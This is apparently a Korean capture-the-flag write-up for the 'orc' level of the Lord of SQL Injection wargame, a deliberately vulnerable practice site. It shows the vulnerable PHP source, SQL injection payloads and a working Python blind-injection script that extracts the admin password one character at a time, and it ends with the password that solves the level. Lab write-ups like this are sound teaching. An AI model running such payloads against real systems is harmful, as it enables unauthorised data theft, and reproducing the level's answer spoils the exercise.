# Lord of SQL Injection No.4 Orc

Orc 문제는 Blind SQL Injection을 통해서 DB의 pw 값을 추출해낼 수 있도록 유도한 문제이다.

## 소스 코드
```php
<?php 
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~"); 
  $query = "select id from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  echo "<hr>query : <strong>{$query}</strong><hr><br>"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if($result['id']) echo "<h2>Hello admin</h2>"; 
  $_GET[pw] = addslashes($_GET[pw]); 
  $query = "select pw from prob_orc where id='admin' and pw='{$_GET[pw]}'"; 
  $result = @mysql_fetch_array(mysql_query($query)); 
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc"); 
  highlight_file(__FILE__); 
?>
```

#### 문제 풀이 조건
```sql
select id from prob_orc where id='admin' and pw='{$_GET[pw]}'";
```
```php
...
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("orc");
...
```
위의 코드를 보면 알 수 있듯이 `Database`의 `pw`값과 `GET` 방식으로 받은 `pw`값이 같으면 문제풀이에 성공하게 된다.
이는 URL에 직접 삽입하여 SQL을 조작하여 푸는 방식이 아니라 직접 `Database`에 있는 `pw`값을 추출 해야한다는 것을 알 수 있다.

`pw`값을 알아내는 데에 사용하려면 `Blind SQL Injection` 을 이용해야한다.

## Blind SQL Injection 알아보기

* [Hacker School - Blind SQL Injection 공격](http://www.hackerschool.org/HS_Boards/data/Lib_share/The_basic_of_Blind_SQL_Injection_PRIDE.pdf)
* [Wikipedia - SQL 삽입 // Blind SQL Injection](https://ko.wikipedia.org/wiki/SQL_%EC%82%BD%EC%9E%85#Blind_SQL_.EC.82.BD.EC.9E.85)

## Solution
```
http://los.eagle-jump.org/orc_***.php?pw=' or length(pw)=8 -- ;
```
URL에 length(pw)=8이 참이 되기 때문에 사이트에서는 `Hello Admin`을 출력한다.
그리고 `Database`의 `pw`는 8자리라는 것을 알 수 있다.

`pw`값의 길이를 알아낸 후 Blind SQL Injection 공격을 하기 위해서 `Python`을 준비한다.
(필자는 Python3를 사용하였습니다.)

```python
import urllib.request
from urllib.parse import quote

result = ""

for i in range(1,9):
    for j in range(ord('0'),ord('z')):
        url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
        add_url = "' or id='admin' and substr(pw,1,{})='{}' -- ;".format(str(i), result+chr(j))
        print("Searching.. - {0}{1}".format(url, add_url))
        add_url = quote(add_url)
        new_url = url + add_url
        re = urllib.request.Request(new_url)

        re.add_header("User-Agent","Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")

        res = urllib.request.urlopen(re)

        if str(res.read()).find("Hello admin") != -1:
            result += chr(j).lower()
            print("Found it!! => " + result)
            break

print("Finished Searching.")
print("Password : " + result)
```

위의 `Python3` 코드는 `Database`에 있는 `pw`를 모두 알아낼 때까지 `for`문을 반복하는 형태이다.

```python
for i in range(1,9):
```
`for`문을 8번(비밀번호 길이) 반복한다는 의미이다.
비밀번호의 길이를 `length` 함수 대입으로 알아내기 힘들다면 `Python` 코드에 비밀번호의 길이를 찾는 코드를 추가하여 대체할 수 있다.

```python
  for j in range(ord('0'),ord('z')):
```
`for`문을 `ASCII`값으로 0부터 z까지 반복한다는 의미이다.
* `ASCII 0` = 48
* `ASCII z` = 122

#### ord

ord 함수는 특정 문자를 `ASCII` 값으로 변환하는 함수이다.

* [php.net - ord 함수](http://php.net/manual/kr/function.ord.php)

```python
  url = "http://los.eagle-jump.org/orc_47190a4d33f675a601f8def32df2583a.php?pw="
```
`Python` 코드를 실행하면서 고정되어 있는 URL을 나타낸다.

```python
  add_url = "' or id='admin' and substr(pw,1,{})='{}' -- ;".format(str(i), result+chr(j))
```
고정된 URL 뒤에 붙을 URL의 일부분을 담은 코드이다.
반복 수행을 하기 위해서는 위의 부분은 항상 유동적으로 변해야하기 때문에 `for`문의 i와 j를 이용하여 대입하는 방식으로 설계되었다.

#### .format

```c
...
  printf("%d", num);
...
```
`format` 함수는 C언어에서 num을 대입하는 것과 같은 형식으로 {} 안에 `format` 뒤에 나오는 값을 매칭시켜 대입할 때에 사용된다.

* [Programmers.co.kr - format 함수](https://programmers.co.kr/learn/courses/%ED%8C%8C%EC%9D%B4%EC%8D%AC-%EC%9E%85%EB%AC%B8/lessons/format)

```python
print("Searching.. - {0}{1}".format(url, add_url))
```
반복문이 돌 때마다 URL을 출력시킨다.

`format` 함수는 {} 안에 숫자를 대입하여 순서를 임의로 지정해줄 수 있다.

```python
add_url = quote(add_url)
```
`quote` 함수에 `add_url` (URL에서 유동적인 부분)을 넣어 `URL Encording`을 수행한다.

```python
new_url = url + add_url
re = urllib.request.Request(new_url)
```
`url` (URL에서 고정되는 부분)과 `add_url` (URL에서 유동적인 부분)을 합쳐 한 줄의 URL을 `new_url`에 저장한다.

```python
import urllib.request
```
위의 `urllib.request` 모듈에서 `Request`라는 클래스를 통해 객체를 생성한다.

```python
re.add_header("User-Agent","Mozilla/5.0")
re.add_header("Cookie", "PHPSESSID=6d7n06fn55kjoc4fas5vuh24j4")
```
`User-Agent`와 `PHPSESSID` 를 `re` 객체의 header에 추가한다.

```python
res = urllib.request.urlopen(re)
```
`re` 객체를 이용하여 서버에 요청을 한다.

```python
if str(res.read()).find("Hello admin") != -1:
  result += chr(j).lower()
  print("Found it!! => " + result)
  break
```
`res.read()`를 통해 객체에서 `Hello admin` 이라는 문자열을 찾은 경우에 `find` 함수에서 문자열의 시작 인덱스를 반환한다. 만약 문자열을 찾지 못했을 경우에는 -1을 반환한다.

`Hello admin`을 찾은 경우에는 `result`라는 변수에 아스키 코드로 j에 해당하는 문자를 붙인 후 현재까지 찾은 `result`를 출력하고 반복문을 탈출한다.

```python
print("Finished Searching.")
print("Password : " + result)
```

반복문이 종료되면 `result`의 값과 `Database`에 있는 `pw`값이 일치하므로 문제 풀이를 위한 `pw`값을 찾아낼 수 있다.

```
http://los.eagle-jump.org/orc_***.php?pw=295d5844
```
pw = 295d5844를 URL에 삽입하면 문제 풀이에 성공한다.